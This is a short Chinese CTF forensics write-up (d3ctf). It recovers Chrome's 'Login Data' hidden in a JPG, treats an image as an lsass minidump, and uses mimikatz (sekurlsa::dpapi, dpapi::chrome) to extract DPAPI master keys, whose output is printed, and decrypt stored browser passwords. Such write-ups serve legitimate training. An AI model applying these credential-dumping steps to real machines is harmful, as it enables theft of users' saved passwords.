观察文件，jpg尾端有多余数据，拿出来看应该是一个zip，可以从里面解压出Login Data。先修复zip，再解压，密码在jpg的exif里，得到Login Data，搜一下是Chrome的密码文件，需要dpapi密钥解密。flag.png是lsass的minidump。于是可以使用mimikatz提取Masterkey：
```
mimikatz # sekurlsa::dpapi
Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : XYF-PC$
Domain            : WORKGROUP
Logon Server      : (null)
Logon Time        : 2019/10/11 13:44:58
SID               : S-1-5-18
         [00000000]
         * GUID      :  {1c75e6df-ac57-43eb-9855-c24f949094a8}
         * Time      :  2019/10/11 13:54:49
         * MasterKey :  56bfec925f8bf140e8c6268f42f8fe2c5c14c5527883f7b9cffd0491fc25c5f9d21ad7c873b79d74cc5b423b0fa27d439e9c119bb8e433ecefd8a377a52d3bc3
         * sha1(key) :  96fe7493207c7c10552c47e2938fc092dd5ca7bb
         [00000001]
         * GUID      :  {129c455d-04cc-4ab8-834a-608501ae3949}
         * Time      :  2019/10/11 13:45:09
         * MasterKey :  99ebdb18130edf2a313b34c2c7ac33ec465521aa46a1f1bc2f94f621395cb9ebdd45b40092eacf8f5a266602a3288f30ecbb36773d4b85c929c63d7c6d136e4e
         * sha1(key) :  bda94d52ac2f75484718b3de7a1605aadc94a33f
         [00000002]
         * GUID      :  {f22e410f-f947-4e08-8f2a-8f65df603f8d}
         * Time      :  2019/10/11 13:44:59
         * MasterKey :  19c05880b67d50f8231cd8009836e3cdc55610e4877f8b976abd5ca15600d0e759934324c6204b56f02527039e7fc52a1dfb5296d3381aaa7c3eb610dffa32fa
         * sha1(key) :  b859b2b52e7e49cf5c70069745c88853c4b23487
```
之后dpapi::chrome解密数据库,得到flag：d3ctf{I_LoVe_FiReFox!@#}。
